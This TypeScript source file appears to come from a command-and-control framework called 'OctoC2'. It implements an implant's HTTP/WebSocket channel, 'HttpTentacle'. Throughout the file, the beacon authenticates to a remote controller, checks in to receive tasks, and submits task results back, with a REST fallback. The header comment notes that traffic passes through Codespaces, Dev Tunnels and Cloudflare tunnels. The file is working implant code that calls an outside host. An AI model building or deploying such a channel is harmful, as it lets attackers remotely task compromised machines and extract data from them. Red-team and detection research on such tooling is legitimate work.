/**
 * OctoC2 — HttpTentacle  (Tentacle 13 — HTTP/WebSocket direct channel)
 *
 * Connects to the C2 server's HTTP endpoint on port 8080 (Codespace public URL
 * or any HTTPS URL). Works through Dev Tunnels and Cloudflare tunnels because
 * it uses HTTP/1.1 (WebSocket upgrade), unlike gRPC which requires H2C.
 *
 * Environment variables (read via dot notation — Bun --define substitution):
 *   SVC_HTTP_URL  — base URL, e.g. "https://codespace-8080.app.github.dev"
 *                   Set at build time via octoctl build-beacon --http-url.
 *
 * Primary:  WebSocket  wss://<host>/ws   (JSON message protocol)
 * Fallback: REST        POST /api/beacon/checkin
 *                       POST /api/beacon/submit-result
 *
 * Auth: Authorization: Bearer <config.controllerToken> on HTTP and WebSocket.
 */

import type {
  BeaconConfig,
  CheckinPayload,
  Task,
  TaskResult,
  ITentacle,
  TentacleKind,
  ResultSubmissionOutcome,
} from "../types.ts";
import { createLogger } from "../logger.ts";
import { requireHttpsControllerUrl } from "../lib/ControllerUrl.ts";

const log = createLogger("HttpTentacle");

const WS_TIMEOUT_MS   = 30_000;
const HTTP_TIMEOUT_MS = 10_000;

export class HttpTentacle implements ITentacle {
  readonly kind: TentacleKind = "http";

  private readonly config: BeaconConfig;
  private baseUrl: string | null = null;
  private activeWs: WebSocket | null = null;

  constructor(config: BeaconConfig) {
    this.config = config;
  }

  private get controllerToken(): string {
    if (!this.config.controllerToken) {
      throw new Error("SVC_BEACON_API_TOKEN is required for the HTTP channel");
    }
    return this.config.controllerToken;
  }

  // ── isAvailable ────────────────────────────────────────────────────────────

  async isAvailable(): Promise<boolean> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const configuredUrl =
      this.config.serverUrl ?? process.env.SVC_HTTP_URL?.trim();
    if (!configuredUrl) {
      log.debug("isAvailable() → false (SVC_HTTP_URL not set)");
      return false;
    }

    try {
      const url = requireHttpsControllerUrl(
        configuredUrl,
        "HttpTentacle controller URL",
      );
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
      const resp = await fetch(`${url}/api/health`, {
        method: "GET",
        headers: { Authorization: `Bearer ${this.controllerToken}` },
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (resp.ok) {
        this.baseUrl = url;
        log.debug(`isAvailable() → true (${url})`);
        return true;
      }
      log.debug(`isAvailable() → false (health check status ${resp.status})`);
      return false;
    } catch (err) {
      log.debug(`isAvailable() → false: ${(err as Error).message}`);
      return false;
    }
  }

  // ── checkin ────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    const url = this.resolveControllerUrl();

    // ── WebSocket path ──────────────────────────────────────────────────────
    try {
      const tasks = await this.wsCheckin(url, payload);
      log.info(`checkin (WS) → ${tasks.length} task(s)`);
      return tasks;
    } catch (err) {
      log.warn(`checkin WS failed (${(err as Error).message}), falling back to REST`);
    }

    // ── REST fallback ───────────────────────────────────────────────────────
    const resp = await fetch(`${url}/api/beacon/checkin`, {
      method:  "POST",
      headers: {
        "Content-Type":  "application/json",
        "Authorization": `Bearer ${this.controllerToken}`,
      },
      body: JSON.stringify(payload),
    });

    if (!resp.ok) {
      throw new Error(`checkin REST failed: HTTP ${resp.status}`);
    }

    const data = await resp.json() as { tasks?: Task[] };
    const tasks: Task[] = data.tasks ?? [];
    log.info(`checkin (REST) → ${tasks.length} task(s)`);
    return tasks;
  }

  // ── submitResult ───────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    const url = this.resolveControllerUrl();

    // ── WebSocket path ──────────────────────────────────────────────────────
    try {
      await this.wsSubmitResult(url, result);
      log.info(`submitResult (WS) task ${result.taskId}`);
      return {
        artifactWritten: true,
        controllerAccepted: true,
        channel: "http",
        acceptance: "direct-response",
      };
    } catch (err) {
      log.warn(`submitResult WS failed (${(err as Error).message}), falling back to REST`);
    }

    // ── REST fallback ───────────────────────────────────────────────────────
    const resp = await fetch(`${url}/api/beacon/submit-result`, {
      method:  "POST",
      headers: {
        "Content-Type":  "application/json",
        "Authorization": `Bearer ${this.controllerToken}`,
      },
      body: JSON.stringify(result),
    });

    if (resp.status !== 200 && resp.status !== 201) {
      throw new Error(`submitResult REST failed: HTTP ${resp.status}`);
    }

    const responseBody = await resp.json().catch(() => null) as {
      accepted?: unknown;
    } | null;
    const accepted = responseBody?.accepted === true;
    log.info(
      `submitResult (REST) task ${result.taskId} ` +
      `(${accepted ? "accepted" : "not accepted"})`,
    );
    return {
      artifactWritten: accepted,
      controllerAccepted: accepted,
      channel: "http",
      acceptance: accepted ? "direct-response" : null,
    };
  }

  // ── teardown ───────────────────────────────────────────────────────────────

  async teardown(): Promise<void> {
    if (this.activeWs) {
      try { this.activeWs.close(); } catch {}
      this.activeWs = null;
    }
    log.debug("teardown() complete");
  }

  // ── private WebSocket helpers ──────────────────────────────────────────────

  private buildWsUrl(baseUrl: string): string {
    return `${requireHttpsControllerUrl(baseUrl).replace(/^https:/, "wss:")}/ws`;
  }

  private resolveControllerUrl(): string {
    const url = requireHttpsControllerUrl(
      this.baseUrl ??
        this.config.serverUrl ??
        process.env.SVC_HTTP_URL?.trim(),
      "HttpTentacle controller URL",
    );
    this.baseUrl = url;
    return url;
  }

  private wsCheckin(baseUrl: string, payload: CheckinPayload): Promise<Task[]> {
    return new Promise<Task[]>((resolve, reject) => {
      const wsUrl = this.buildWsUrl(baseUrl);
      let ws: WebSocket;
      try {
        ws = new WebSocket(wsUrl, { headers: { Authorization: `Bearer ${this.controllerToken}` } });
      } catch (err) {
        return reject(err);
      }

      this.activeWs = ws;

      let settled = false;
      let timer: ReturnType<typeof setTimeout> | undefined;

      const cleanup = () => {
        if (timer !== undefined) clearTimeout(timer);
        if (this.activeWs === ws) this.activeWs = null;
      };
      const fail = (error: Error) => {
        if (settled) return;
        settled = true;
        cleanup();
        try { ws.close(); } catch {}
        reject(error);
      };
      const succeed = (tasks: Task[]) => {
        if (settled) return;
        settled = true;
        cleanup();
        try { ws.close(); } catch {}
        resolve(tasks);
      };

      timer = setTimeout(() => {
        fail(new Error("WS checkin timeout"));
      }, WS_TIMEOUT_MS);

      ws.onopen = () => {
        ws.send(JSON.stringify({ type: "checkin", payload }));
      };

      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data as string) as {
            type: string;
            tasks?: Task[];
            message?: string;
          };
          if (msg.type === "checkin-response") {
            succeed(msg.tasks ?? []);
          } else if (msg.type === "error") {
            fail(new Error(
              `WS checkin server error: ${msg.message ?? "unknown error"}`,
            ));
          }
          // Unexpected non-terminal messages leave the timeout running.
        } catch (err) {
          fail(new Error(`WS checkin parse error: ${(err as Error).message}`));
        }
      };

      ws.onerror = () => {
        fail(new Error("WS checkin connection error"));
      };

      ws.onclose = (event) => {
        if (settled) return;
        fail(new Error(
          `WS checkin closed before response (code ${event.code}, clean=${event.wasClean})`,
        ));
      };
    });
  }

  private wsSubmitResult(baseUrl: string, result: TaskResult): Promise<void> {
    return new Promise<void>((resolve, reject) => {
      const wsUrl = this.buildWsUrl(baseUrl);
      let ws: WebSocket;
      try {
        ws = new WebSocket(wsUrl, { headers: { Authorization: `Bearer ${this.controllerToken}` } });
      } catch (err) {
        return reject(err);
      }

      this.activeWs = ws;

      let settled = false;
      let timer: ReturnType<typeof setTimeout> | undefined;

      const cleanup = () => {
        if (timer !== undefined) clearTimeout(timer);
        if (this.activeWs === ws) this.activeWs = null;
      };
      const fail = (error: Error) => {
        if (settled) return;
        settled = true;
        cleanup();
        try { ws.close(); } catch {}
        reject(error);
      };
      const succeed = () => {
        if (settled) return;
        settled = true;
        cleanup();
        try { ws.close(); } catch {}
        resolve();
      };

      timer = setTimeout(() => {
        fail(new Error("WS submitResult timeout"));
      }, WS_TIMEOUT_MS);

      ws.onopen = () => {
        ws.send(JSON.stringify({ type: "submit-result", result }));
      };

      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data as string) as {
            type: string;
            message?: string;
          };
          if (msg.type === "result-accepted") {
            succeed();
          } else if (msg.type === "error") {
            fail(new Error(
              `WS submitResult server error: ${msg.message ?? "unknown error"}`,
            ));
          }
          // Unexpected non-terminal messages leave the timeout running.
        } catch (err) {
          fail(new Error(`WS submitResult parse error: ${(err as Error).message}`));
        }
      };

      ws.onerror = () => {
        fail(new Error("WS submitResult connection error"));
      };

      ws.onclose = (event) => {
        if (settled) return;
        fail(new Error(
          `WS submitResult closed before response (code ${event.code}, clean=${event.wasClean})`,
        ));
      };
    });
  }
}
